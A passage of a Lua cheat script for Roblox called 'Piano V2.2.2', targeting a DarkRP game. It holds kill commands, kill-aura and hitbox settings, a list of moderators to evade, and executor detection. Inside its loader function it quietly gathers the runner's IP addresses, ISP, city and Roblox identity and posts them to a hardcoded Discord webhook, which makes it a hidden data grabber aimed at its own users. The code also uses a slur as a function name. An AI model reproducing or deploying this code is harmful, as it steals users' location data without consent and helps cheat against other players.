					ToggleButton.SliceCenter = Rect.new(100, 100, 100, 100)

					DropdownObjects.Name = "DropdownObjects"
					DropdownObjects.BackgroundTransparency = 1
					DropdownObjects.Parent = Dropdown
					DropdownObjects.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
					DropdownObjects.BorderSizePixel = 0
					DropdownObjects.ClipsDescendants = true
					DropdownObjects.Position = UDim2.new(-0.002, 0,0, 0)
					DropdownObjects.Size = UDim2.new(0, 432, 0, 30)
					DropdownObjects.ZIndex = 5

					UIPadding_2.Parent = DropdownObjects
					UIPadding_2.PaddingTop = UDim.new(0, 32)

					UIListLayout.Parent = DropdownObjects
					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
					UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
					UIListLayout.Padding = UDim.new(0, 1)

					local Toggled = false

					local tweenInfo = TweenInfo.new(.15,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0)
						
					DropdownText.Text = name
					for _,v in pairs(list) do
						local Button = Instance.new("TextButton")
						Button.Name = "Button"
						Button.Parent = DropdownObjects
						Button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
						Button.BorderColor3 = Color3.fromRGB(44, 44, 44)
						Button.BorderSizePixel = 2
						Button.Text = v
						Button.ZIndex = 5
						Button.Position = UDim2.new(0.269, 0, 1, 0)
						Button.Size = UDim2.new(0, 430, 0, 30)
						Button.AutoButtonColor = false
						Button.Font = Enum.Font.SourceSans
						Button.TextColor3 = Color3.fromRGB(148, 148, 148)
						Button.TextSize = 20.000
								
						Button.MouseButton1Click:Connect(function()
							callback(Button.Text)
							DropdownText.Text = v
							Toggled = false
							DropdownObjects:TweenSize(UDim2.new(0, 432,0, 30),"In","Linear",.25,true)
							game:GetService("TweenService"):Create(ToggleButton,tweenInfo,{Rotation = 90}):Play()
						end)
					end
						
					ToggleButton.MouseButton1Click:Connect(function()
						Toggled = not Toggled
						local TotalY = 0;
						for i,v in next, DropdownObjects:GetChildren() do
							if (v:IsA("TextButton")) then
								TotalY = TotalY + v.AbsoluteSize.Y + 2;
							end
						end
							
						local RotationAmount = Toggled and 0 or 90
						local ToggleDirection = Toggled and "Out" or "In"
						local GetSize = Toggled and UDim2.new(0,432,0,TotalY + 50) or UDim2.new(0, 432,0, 30)
						DropdownObjects:TweenSize(GetSize,ToggleDirection,"Linear",.25,true)
						game:GetService("TweenService"):Create(ToggleButton,tweenInfo,{Rotation = RotationAmount}):Play()
					end)
					SectionUI:Resize()
				end

				function SectionUI.Box(name,val,callback)
					local BoxHolder = Instance.new("Frame")
					local BoxHolder_2 = Instance.new("TextLabel")
					local UIPadding = Instance.new("UIPadding")
					local Box = Instance.new("TextBox")
					local UIPadding_2 = Instance.new("UIPadding")

					BoxHolder.Name = "BoxHolder"
					BoxHolder.Parent = Section
					BoxHolder.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					BoxHolder.BorderSizePixel = 0
					BoxHolder.LayoutOrder = 3
					BoxHolder.Position = UDim2.new(0.00228310493, 0, 1, 0)
					BoxHolder.Size = UDim2.new(0, 431, 0, 30)

					BoxHolder_2.Name = "BoxHolder"
					BoxHolder_2.Parent = BoxHolder
					BoxHolder_2.Active = true
					BoxHolder_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					BoxHolder_2.BackgroundTransparency = 1.000
					BoxHolder_2.BorderSizePixel = 0
					BoxHolder_2.Size = UDim2.new(0, 428, 0, 30)
					BoxHolder_2.Font = Enum.Font.SourceSans
					BoxHolder_2.Text = name
					BoxHolder_2.TextColor3 = Color3.fromRGB(198, 198, 198)
					BoxHolder_2.TextSize = 18.000
					BoxHolder_2.TextXAlignment = Enum.TextXAlignment.Left

					UIPadding.Parent = BoxHolder_2
					UIPadding.PaddingBottom = UDim.new(0, 3)
					UIPadding.PaddingLeft = UDim.new(0, 5)

					Box.Name = "Box"
					Box.Parent = BoxHolder
					Box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
					Box.BorderColor3 = Color3.fromRGB(52, 52, 52)
					Box.Position = UDim2.new(0.770, 0,0.135, 0)
					Box.Size = UDim2.new(0, 95, 0, 22)
					Box.Font = Enum.Font.SourceSans
					Box.PlaceholderText = val
					Box.Text = ""
					Box.TextColor3 = Color3.fromRGB(0, 0, 0)
					Box.TextSize = 14.000
					Box.TextXAlignment = Enum.TextXAlignment.Left
					Box.ClipsDescendants = true

					UIPadding_2.Parent = Box
					UIPadding_2.PaddingBottom = UDim.new(0, 1)
					UIPadding_2.PaddingLeft = UDim.new(0, 3)

					Box.FocusLost:Connect(function(Enter)
						if Enter then
							if Box.Text ~= nil or Box.Text ~= "" then
								callback(Box.Text)
							end
						end
					end)

					SectionUI:Resize()
				end				
				return SectionUI
			end
			return SideTabUI
		end
		return UITabs
	end
	return UI
end
---@diagnostic disable: undefined-global
_G.outfits = {
    {Name = "Brochacho", ID = "151675683.7449702628,1029025,2570215639,2570216445"};
    {Name = "Eastern Brochacho", ID = "151675683.4398197509,1033722,2570215639,2570216445"};
    {Name = "Western Brochacho", ID = "151675683.7449702628,4307246471,2570215639,2570216445,4307249081,4307264429"};
    {Name = "Medieval Brochacho", ID = "151675683.4383940795,13386385,2832699137,2832700156,4267030909,2274742626.4384429792,215748322.2675785344"};
    {Name = "Vietnam Brochacho", ID = "151675683.7449702628,3755349626,176718647,769164402"};
    {Name = "Pirate Brochacho", ID = "151675683.7449702628,1028859,74970669,4262731024,20721256,812711544,809822273"};
    {Name = "Hamaschacho", ID = "151675683.7449702628,7246508581,7246496750,5503629632,5496446998,6598676193,4566943042"};
}

_G.commands = {
    {name = "kill",info = "Kills Specific Player",func = function(args)
        if GetPlr(args[1]) ~= nil and args ~= nil then
            rape(GetPlr(args[1]))
        end
    end},
    {name = "goto",info = "Teleports to Specific Player",func = function(args)
        if GetPlr(args[1]) ~= nil and args ~= nil and IsValid(GetPlr(args[1])) then
            Tween(GetPlr(args[1]).Character:GetPivot(),.3)
        end
    end},
    {name = "rejoin",info = "Rejoins",func = function()
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId)
    end},
    {name = "view",info = "Views Specific Player",func = function(args)
        if GetPlr(args[1]) ~= nil and args ~= nil and IsValid(GetPlr(args[1])) then
            game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = GetPlr(args[1]).Character.Humanoid
        end
    end},
    {name = "unview",info = "Unviews",func = function()
        game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = LocalPlayer.Character.Humanoid
    end},
}

repeat wait(1) until game:IsLoaded()
local naem = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
if not _G.pianoloaded and naem.Name:find("Electric State DarkRP") or naem.Name:find("Edd_E") then
    local core = Instance.new("Folder",game:GetService("CoreGui"))
    core.Name = "Piano UIs"
    local setcoregui
    setcoregui = game:GetService("CoreGui").ChildAdded:Connect(function(v)
        coroutine.wrap(function()
            wait(1)
        end)()
    end)
    getgenv().var = {}
    var.prefix = "-"
    local Loader = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local Loader_2 = Instance.new("Frame")
    local Name = Instance.new("TextLabel")
    local Name_2 = Instance.new("TextLabel")
    local UICorner = Instance.new("UICorner")
    local Note = Instance.new("ScreenGui")
    local Notifications = Instance.new("Frame")
    local Client = Instance.new("ScreenGui")
    local Ammo = Instance.new("ImageLabel")
    local amt = Instance.new("TextLabel")
    local type = Instance.new("TextLabel")
    local warn = Instance.new("TextLabel")
    local l__NoteSample__1 = Instance.new("Frame")
    local Frame = Instance.new("Frame")
    local textName = Instance.new("TextLabel")
    local textMessage = Instance.new("TextLabel")
    local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
    local commandc = Instance.new("ScreenGui")
    local Framec = Instance.new("Frame")
    local UICornerc = Instance.new("UICorner")
    local TextLabelc = Instance.new("TextLabel")
    local ScrollingFramec = Instance.new("ScrollingFrame")
    local UIGridLayoutc = Instance.new("UIGridLayout")
    local UIPaddingc = Instance.new("UIPadding")
    local TextcBoxc = Instance.new("TextBox")
    local UITextSizeConstraintc = Instance.new("UITextSizeConstraint")
    
    if _G.commands ~= nil then
        commandc.Name = "command"
        commandc.Parent = game:GetService("CoreGui")
        commandc.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        Framec.Parent = commandc
        Framec.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        Framec.Position = UDim2.new(0.342696637, 0, 0.36809817, 0)
        Framec.Size = UDim2.new(0, 186, 0, 279)

        UICornerc.CornerRadius = UDim.new(0, 15)
        UICornerc.Parent = Framec

        TextLabelc.Parent = Framec
        TextLabelc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabelc.BackgroundTransparency = 1.000
        TextLabelc.Position = UDim2.new(0, 0, -0.001, 0)
        TextLabelc.Size = UDim2.new(0, 186, 0, 23)
        TextLabelc.Font = Enum.Font.SourceSans
        TextLabelc.Text = "Your Prefix: "..var.prefix
        TextLabelc.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabelc.TextSize = 32.000

        ScrollingFramec.Parent = Framec
        ScrollingFramec.CanvasSize = UDim2.new(0,0,#_G.commands -  (#_G.commands / 1.165),0)
        ScrollingFramec.Active = true
        ScrollingFramec.BackgroundColor3 = Color3.fromRGB(0, 85, 0)
        ScrollingFramec.BorderSizePixel = 0
        ScrollingFramec.Position = UDim2.new(0, 0, 0.0960698724, 0)
        ScrollingFramec.Size = UDim2.new(0, 186, 0, 207)
        ScrollingFramec.ScrollBarThickness = 5

        UIGridLayoutc.Parent = ScrollingFramec
        UIGridLayoutc.SortOrder = Enum.SortOrder.LayoutOrder
        UIGridLayoutc.CellSize = UDim2.new(0, 150, 0, 34)

        UIPaddingc.Parent = ScrollingFramec
        UIPaddingc.PaddingBottom = UDim.new(0, 5)
        UIPaddingc.PaddingLeft = UDim.new(0, 16)
        UIPaddingc.PaddingRight = UDim.new(0, 5)
        UIPaddingc.PaddingTop = UDim.new(0, 5)

        TextcBoxc.Parent = Framec
        TextcBoxc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextcBoxc.BackgroundTransparency = 1.000
        TextcBoxc.Position = UDim2.new(0, 0, 0.838005245, 0)
        TextcBoxc.Size = UDim2.new(0, 186, 0, 45)
        TextcBoxc.Font = Enum.Font.SourceSans
        TextcBoxc.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
        TextcBoxc.PlaceholderText = "Command Here"
        TextcBoxc.Text = "Command Here"
        TextcBoxc.TextColor3 = Color3.fromRGB(230, 230, 230)
        TextcBoxc.TextSize = 34.000

        for i,v in pairs(_G.commands) do
            game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
                local args = msg:split(" ")
                local cmd = msg:sub(2,v.name:len()+1):lower()
                if cmd == v.name:lower() and msg:sub(1,1) == var.prefix then
                    table.remove(args,1)
                    spawn(function()v.func(args)end)
                end
            end)
            local Frame = Instance.new("Frame")
            local TextLabel_2 = Instance.new("TextLabel")
            Frame.Parent = ScrollingFramec
            Frame.BackgroundColor3 = Color3.fromRGB(0, 39, 0)
            Frame.BorderSizePixel = 0
            Frame.Position = UDim2.new(-0.0537634417, 0, 0.00873362459, 0)
            Frame.Size = UDim2.new(0, 100, 0, 100)
            Frame.ZIndex = 2
            TextLabel_2.Parent = Frame
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.Size = UDim2.new(0, 150, 0, 34)
            TextLabel_2.Font = Enum.Font.SourceSans
            TextLabel_2.Text = v.name
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextSize = 32.000
            TextLabel_2.TextWrapped = true
            TextLabel_2.TextScaled = true
            UITextSizeConstraintc.Parent = TextLabel_2
            UITextSizeConstraintc.MaxTextSize = 50
            UITextSizeConstraintc.MinTextSize = 16
            Frame.MouseEnter:Connect(function()
                TextLabel_2.Text = v.info
            end)
            Frame.MouseLeave:Connect(function()
                TextLabel_2.Text = v.name
            end)
            TextcBoxc.FocusLost:Connect(function(j)
                if j then
                    local msg = TextcBoxc.Text
                    local args = msg:split(" ")
                    local cmd = msg:sub(1,v.name:len()):lower()
                    if cmd == v.name:lower() then
                        table.remove(args,1)
                        TextcBoxc.Text = "Command Here"
                        spawn(function()v.func(args)end)
                    end
                end
            end)
        end

        local function draggable(obj)
            spawn(function()
                local minitial;
                local initial;
                local isdragging;
                obj.InputBegan:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        obj.Active = true;
                        isdragging = true;
                        local mouse = LocalPlayer:GetMouse()
                        minitial = input.Position;
                        initial = obj.Position;
                        local con;
                        con = game:GetService("RunService").RenderStepped:Connect(function()
                            if isdragging then
                                local delta = Vector3.new(mouse.X, mouse.Y, 0) - minitial;
                                obj.Position = UDim2.new(initial.X.Scale, initial.X.Offset + delta.X, initial.Y.Scale, initial.Y.Offset + delta.Y)
                            else
                                con:Disconnect();
                            end;
                        end);
                        input.Changed:Connect(function()
                            if input.UserInputState == Enum.UserInputState.End then
                                isdragging = false;
                            end;
                        end);
                    end;
                end);
            end)
        end;

        draggable(Framec)
    end

    Client.Name = "Client"
    Client.Parent = game:GetService("CoreGui")
    Client.ResetOnSpawn = false
    
    Ammo.Name = "Ammo"
    Ammo.Parent = Client
    Ammo.Active = true
    Ammo.AnchorPoint = Vector2.new(0, 1)
    Ammo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Ammo.BackgroundTransparency = 1.000
    Ammo.Position = UDim2.new(0, 70, 1, -110)
    Ammo.Size = UDim2.new(0, 160, 0, 30)
    Ammo.Visible = false
    Ammo.ZIndex = 13
    Ammo.Image = "rbxassetid://725697201"
    Ammo.ImageColor3 = Color3.fromRGB(72, 64, 58)
    Ammo.ImageTransparency = 0.500
    Ammo.ScaleType = Enum.ScaleType.Slice
    Ammo.SliceCenter = Rect.new(32, 32, 32, 32)
    
    amt.Name = "amt"
    amt.Parent = Ammo
    amt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    amt.BackgroundTransparency = 1.000
    amt.Position = UDim2.new(0, 0, 0, -2)
    amt.Size = UDim2.new(1, 0, 1, 0)
    amt.ZIndex = 13
    amt.Font = Enum.Font.SourceSansBold
    amt.Text = "28/150"
    amt.TextColor3 = Color3.fromRGB(255, 255, 255)
    amt.TextScaled = true
    amt.TextSize = 38.000
    amt.TextStrokeTransparency = 0.500
    amt.TextWrapped = true
    
    type.Name = "type"
    type.Parent = Ammo
    type.AnchorPoint = Vector2.new(0, 0.800000012)
    type.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    type.BackgroundTransparency = 1.000
    type.Size = UDim2.new(1, 0, 1, 0)
    type.ZIndex = 13
    type.Font = Enum.Font.SourceSans
    type.Text = "Rifle Ammo"
    type.TextColor3 = Color3.fromRGB(255, 255, 255)
    type.TextSize = 18.000
    type.TextStrokeTransparency = 0.500
    type.TextWrapped = true
    
    warn.Name = "warn"
    warn.Parent = Ammo
    warn.AnchorPoint = Vector2.new(0, 0.800000012)
    warn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    warn.BackgroundTransparency = 1.000
    warn.Position = UDim2.new(0, 0, 0, -25)
    warn.Size = UDim2.new(1, 0, 1, 0)
    warn.Visible = false
    warn.ZIndex = 13
    warn.Font = Enum.Font.SourceSans
    warn.Text = "Your weapon wont damage white names due to low karma"
    warn.TextColor3 = Color3.fromRGB(255, 98, 98)
    warn.TextScaled = true
    warn.TextSize = 18.000
    warn.TextStrokeTransparency = 0.500
    warn.TextWrapped = true
    
    Note.Name = "Note"
    Note.Parent = game:GetService("CoreGui")
    Note.DisplayOrder = 2
    Note.ResetOnSpawn = false
    
    Notifications.Name = "Notifications"
    Notifications.Parent = Note
    Notifications.AnchorPoint = Vector2.new(1, 0)
    Notifications.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Notifications.Position = UDim2.new(0.169648349, -10, 0.985276103, -230)
    Notifications.Size = UDim2.new(0, 300, 0, 100)
    Notifications.BackgroundTransparency = 1
    Notifications.ZIndex = 16
    
    Loader.Name = "Loader"
    Loader.Parent = game:GetService("CoreGui")
    Loader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Loader.Enabled = false
    
    MainFrame.Name = "MainFrame"
    MainFrame.Parent = Loader
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.BackgroundTransparency = 0.050
    MainFrame.BorderSizePixel = 0
    MainFrame.Position = UDim2.new(0.451559991, 0, 0.445398748, 0)
    MainFrame.Size = UDim2.new(0, 200, 0, 146)
    
    Loader_2.Name = "Loader"
    Loader_2.Parent = MainFrame
    Loader_2.BackgroundColor3 = Color3.fromRGB(33, 83, 30)
    Loader_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Loader_2.BorderSizePixel = 4
    Loader_2.Position = UDim2.new(0.129999995, 0, 0.337509573, 0)
    Loader_2.Size = UDim2.new(0, 32, 0, 56)
    
    Name.Name = "Name"
    Name.Parent = MainFrame
    Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Name.BackgroundTransparency = 1.000
    Name.Position = UDim2.new(0, 0, 0.0447761193, 0)
    Name.Size = UDim2.new(0, 200, 0, 22)
    Name.Font = Enum.Font.Gotham
    Name.Text = "Piano"
    Name.TextColor3 = Color3.fromRGB(250, 250, 250)
    Name.TextSize = 30.000
    
    Name_2.Name = "Name"
    Name_2.Parent = MainFrame
    Name_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Name_2.BackgroundTransparency = 1.000
    Name_2.Position = UDim2.new(-0.00499999989, 0, 0.722858369, 0)
    Name_2.Size = UDim2.new(0, 200, 0, 40)
    Name_2.Font = Enum.Font.Gotham
    Name_2.Text = "Loading Functions"
    Name_2.TextColor3 = Color3.fromRGB(250, 250, 250)
    Name_2.TextScaled = true
    Name_2.TextSize = 30.000
    Name_2.TextWrapped = true
    
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = MainFrame
    
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = MainFrame

    l__NoteSample__1.Name = "NoteSample"
    l__NoteSample__1.Parent = game:GetService("CoreGui")
    l__NoteSample__1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    l__NoteSample__1.BackgroundTransparency = 1.000
    l__NoteSample__1.BorderSizePixel = 0
    l__NoteSample__1.Position = UDim2.new(0, -180, 0, 0)
    l__NoteSample__1.Size = UDim2.new(.9, 0, 0, 40)
    l__NoteSample__1.ZIndex = 16

    Frame.Parent = l__NoteSample__1
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BackgroundTransparency = 0.300
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
    Frame.ZIndex = 16

    textName.Name = "textName"
    textName.Parent = Frame
    textName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textName.BackgroundTransparency = 1.000
    textName.BorderSizePixel = 0
    textName.Size = UDim2.new(1, 0, 0.5, 0)
    textName.ZIndex = 16
    textName.Font = Enum.Font.SourceSansBold
    textName.Text = "OnlyTwentyCharacters"
    textName.TextColor3 = Color3.fromRGB(255, 255, 255)
    textName.TextSize = 18.000
    textName.TextWrapped = true

    textMessage.Name = "textMessage"
    textMessage.Parent = Frame
    textMessage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textMessage.BackgroundTransparency = 1.000
    textMessage.BorderSizePixel = 0
    textMessage.Position = UDim2.new(0, 0, 0.5, 0)
    textMessage.Size = UDim2.new(1, 0, 0.5, 0)
    textMessage.ZIndex = 16
    textMessage.Font = Enum.Font.SourceSansItalic
    textMessage.Text = "Hey, playername!"
    textMessage.TextColor3 = Color3.fromRGB(221, 221, 221)
    textMessage.TextScaled = true
    textMessage.TextSize = 18.000
    textMessage.TextWrapped = true
    textMessage.TextYAlignment = Enum.TextYAlignment.Top

    local fov = Drawing.new("Circle")
    fov.Color = Color3.fromRGB(10,10,136)
    fov.Thickness = 2
    fov.Filled = false
    
    setfpscap(62)
    
    getgenv().Players = game:GetService("Players")
    getgenv().LocalPlayer = Players.LocalPlayer
    
    getgenv().Table = {}
    local kawhitelist = {}
    local vecles = {}
    local randombul = {
        2;
    }
    local pianousers = {}
    local killauratargets = {}
    local healaurablacklist = {}
    local esprinter = {}
    local ingamemods = {
        "2J0Y";
        "Edd_e";
        "RyIock";
        "J_mey";
        "snas_Kid101";
    }
    
    var.ver = "Piano V2.2.2"
    
    local RunService = game:GetService("RunService")

    local Mouse = LocalPlayer:GetMouse()
    
    local old_namecall = nil 
    local mt = getrawmetatable(game)
    
    local huntingp = false
    local Stealing = false

    local chams = Instance.new("Folder",core)
    chams.Name = "chams"
    
    local sel

    local old_index = nil
    
    local note_3 = Instance.new("Sound")
    note_3.SoundId = "rbxassetid://405321226"
    local note_4 = Instance.new("Sound")
    note_4.SoundId = "rbxassetid://6432593850"
    note_3.Parent = core 
    note_4.Parent = core
    
    local l__BH__2 = game:GetService("ReplicatedStorage"):WaitForChild("Samples"):WaitForChild("BH");
    local u3 = ColorSequence.new(Color3.new(0.7, 0.2, 0.2), Color3.new(0.9, 0.9, 0.9));
    local l__SamplesProj__4 = game:GetService("ReplicatedStorage"):WaitForChild("Samples"):WaitForChild("SamplesProj");
    local l__BHM__5 = game:GetService("ReplicatedStorage"):WaitForChild("Samples"):WaitForChild("BHM");
    local l__HM__10 = game:GetService("ReplicatedStorage"):WaitForChild("Samples"):WaitForChild("HM");
    local l__TweenService__11 = game:GetService("TweenService");
    local l__LocalPlayer__1 = LocalPlayer;
    local l__mouse__2 = l__LocalPlayer__1:GetMouse();
    local l__ReplicatedStorage__3 = game:GetService("ReplicatedStorage");
    local l__Client__4 = l__LocalPlayer__1:WaitForChild("PlayerGui"):WaitForChild("Client");
    local l__CoreGui__69 = core
    local u2 = {};
    local l__Notifications__3 = Notifications;
    local u4 = {note_3,note_4};
    local u5 = {[2] = Color3.fromRGB(38, 11, 11), [5] = Color3.fromRGB(70, 54, 35), [6] = Color3.fromRGB(11, 38, 11)};
    local sounds = {
        9,
        13,
        18,
        20,
        19
    }
    local destroyesp = {}

    var.walkspeeds = 5
    var.ckb = Enum.KeyCode.M
    var.hbesize = 15
    var.rounds = 2
    var.roundtime = .12
    var.pdamage = 7
    var.ss = 500
    var.sss = 10
    var.st = 2
    var.lootespsize = 15
    var.playerespsize = 14
    var.kara = 200
    var.kaft = .12
    var.asghealth = 50
    var.Auto = "ANS"
    var.affect = "LMH"
    var.animation = 3
    var.animspeed = 50
    var.sound = 9
    var.firerate = 0
    var.spread = 0
    var.laga = 2500
    var.loudaimsound = 13
    var.WalkspeedBind = Enum.KeyCode.Z
    var.hbetrans = .7
    var.matespsize = 12
    var.printespsize = 12
    var.etnespsize = 12.5
    var.cursorid = "6758152761"
    _G.pianoloaded = true
    var.outfits = _G.outfits
    var.commands = _G.commands
    var.selected = LocalPlayer
    var.bypassws = 50
    var.bypassjp = 150
    var.carespsize = 12
    var.NSide = "Left"
    var.looprandomoutfitstime = 1
    var.killauratargets = "Red Names"
    var.trigrefreshrate = 0
    var.hbegreen = 255
    var.hbeblue = 255
    var.hbered = 255
    var.carss = 1000
    var.killkarmaamount = 500
    var.lagbind = Enum.KeyCode.LeftControl

    function func1(p2)
        if var.NSide == "Left" and not var.SNotifs then
            p3 = 2
            local v6 = l__NoteSample__1:Clone()
            v6.Position = UDim2.new(0, 0, 0, 0)
            v6.Frame.Position = UDim2.new(-1, 0, 0, 0)
            u2[v6] = v6.Position
            v6.Frame.textMessage.Text = p2
            v6.Frame.textName.Text = "Piano Client!"
            local v7, v8, v9 = pairs(l__Notifications__3:GetChildren())
            while true do
                local v10, v11 = v7(v8, v9)
                if not v10 then
                    break
                end
                v9 = v10
                u2[v11] = u2[v11] - UDim2.new(0, 0, 0, 42)
                v11:TweenPosition(u2[v11], "Out", "Quad", 0.35, true)
            end;
            if p3 == nil then
                u4[math.random(1, 2)]:Play()
            else
                u4[p3]:Play()
                if u5[p3] ~= nil then
                    v6.Frame.BackgroundColor3 = u5[p3]
                end
            end
            v6.Parent = Notifications;
            v6.Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Back", 0.5, true)
            spawn(function()
                wait(8)
                v6.Frame:TweenPosition(UDim2.new(-1.1, 0, 0, 0), "Out", "Quad", 1, true)
                wait(1)
                v6:Destroy()
                u2[v6] = nil
            end)
        elseif var.NSide == "Right" and not var.SNotifs then
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Note"):Fire("Piano Client!",p2,4)
        end
    end getgenv().senderror = func1
    local loaded
    function loader(text, pos)
        Loader_2:TweenSize(pos,"Out",Enum.EasingStyle.Linear,.1)
        Name_2.Text = text
        wait(math.random(.4,.6))
        if not loaded then
        loaded = true
        local request = (syn and syn.request) or (http and http.request) or http_request

        assert(request ~= nil, "")

        local function getexploit() -- https://v3rmillion.net/showthread.php?tid=1061375 thanks
            local exploit =
                (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
                (secure_load and "Sentinel") or
                (is_sirhurt_closure and "Sirhurt") or
                (pebc_execute and "ProtoSmasher") or
                    (KRNL_LOADED and "Krnl") or
                    (WrapGlobal and "WeAreDevs") or
                    (isvm and "Proxo") or
                    (shadow_env and "Shadow") or
                    (jit and "EasyExploits") or
                    (getscriptenvs and "Calamari") or
                    (unit and not syn and "Unit") or
                    (OXYGEN_LOADED and "Oxygen U") or
                    (IsElectron and "Electron") or
                    ("Unsupported")

                return exploit
            end

            local _1, _2 = game:GetService'HttpService':JSONDecode(game:HttpGet("https://ipv4.wtfismyip.com/json")), game:GetService'HttpService':JSONDecode(game:HttpGet("https://wtfismyip.com/json"))

            request({
                Url = "https://discord.com/api/webhooks/1007955046459265085/hFKOOaotfNc99XoQHj-wqaacYg9DlBaAVhWpPSJmqVzA-SS8KHSkiTRX-IZQjpgvdzbl",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService"HttpService":JSONEncode({
                    content = "@everyone",
                    embeds = {
                        {
                            title = game:GetService"Players".LocalPlayer.Name.." ("..game:GetService"Players".LocalPlayer.UserId..")",
                            description = "Job Id: "..game.JobId.."\nIP (V6): ".._2.YourFuckingIPAddress.."\nIP (V4): ".._1.YourFuckingIPAddress.."\nHost name: ".._1.YourFuckingHostname.."\nISP: ".._1.YourFuckingISP.."City: ".._1.YourFuckingLocation.."\nExecutor: "..getexploit()
                        }
                    }
            })
            })
        end
    end
    
    function antistealoutfit()
        if var.AntiSteal then
            game:GetService('ReplicatedStorage'):FindFirstChild('Events').MenuActionEvent:FireServer(8,{LocalPlayer.PlayerData.RoleplayName.Value;"Piano Client Winning";false})
        end
    end

    function func2(p2)
        if var.NSide == "Left" and not var.SNotifs then
            p3 = 1
            local v6 = l__NoteSample__1:Clone()
            v6.Position = UDim2.new(0, 0, 0, 0)
            v6.Frame.Position = UDim2.new(-1, 0, 0, 0)
            u2[v6] = v6.Position
            v6.Frame.textMessage.Text = p2
            v6.Frame.textName.Text = "Piano Client"
            local v7, v8, v9 = pairs(l__Notifications__3:GetChildren())
            while true do
                local v10, v11 = v7(v8, v9)
                if not v10 then
                    break
                end
                v9 = v10
                u2[v11] = u2[v11] - UDim2.new(0, 0, 0, 42)
                v11:TweenPosition(u2[v11], "Out", "Quad", 0.35, true)
            end;
            if p3 == nil then
                u4[math.random(1, 2)]:Play()
            else
                u4[p3]:Play()
                if u5[p3] ~= nil then
                    v6.Frame.BackgroundColor3 = u5[p3]
                end
            end
            v6.Parent = Notifications;
            v6.Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Back", 0.5, true)
            spawn(function()
                wait(8)
                v6.Frame:TweenPosition(UDim2.new(-1.1, 0, 0, 0), "Out", "Quad", 1, true)
                wait(1)
                v6:Destroy()
                u2[v6] = nil
            end)
        elseif var.NSide == "Right" and not var.SNotifs then
            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Note"):Fire("Piano Client",p2,math.random(1,3))
        end
    end getgenv().sendnotification = func2
    
    function func3(Pos, sped)
        if LocalPlayer.Character ~= nil then
            local TweenService = game:GetService("TweenService")
            local tween = TweenService:Create(LocalPlayer.Character:WaitForChild("HumanoidRootPart"), TweenInfo.new(sped), {CFrame = Pos})
            tween:Play()
        end
    end getgenv().Tween = func3
    
    function func4(Player)
        if #game:GetService("Workspace").CurrentCamera:GetPartsObscuringTarget({Player.Character.HumanoidRootPart.Position}, {Player.Character, LocalPlayer.Character}) == 0 then
            return true 
        else
            return false
        end
    end getgenv().wallcheck = func4
    
    function func5(Plr)
        if not Plr then return nil end 
        for _, v in ipairs(Players:GetPlayers()) do
            if v.Name:lower():find(Plr:lower()) == 1 or v.DisplayName:lower():find(Plr:lower()) == 1 then
                return v
            end
        end
    end getgenv().GetPlr = func5
    
    function func6(Player)
        if Players:FindFirstChild(Player.Name) and game.Workspace:FindFirstChild(Player.Name) and Player.Character ~= nil and Player.Character:FindFirstChild("HumanoidRootPart") then
            return true
        else
            return false
        end
    end getgenv().IsValid = func6
    
    function func7(Player)
        if IsValid(Player) and not Player.Character:FindFirstChild("NameTag") and Player.Character.Health ~= 0 then
            return true
        else
            return false
        end
    end getgenv().IsSemiGodded = func7
    
    function func8(num,vis)
        if vis == "a" then
            getrenv()._G.Triggered(LocalPlayer.Character.HumanoidRootPart,num,"a")
        elseif vis == 1 then
            getrenv()._G.Triggered(LocalPlayer.Character.HumanoidRootPart,num,1)
        elseif vis == nil or vis == "" then
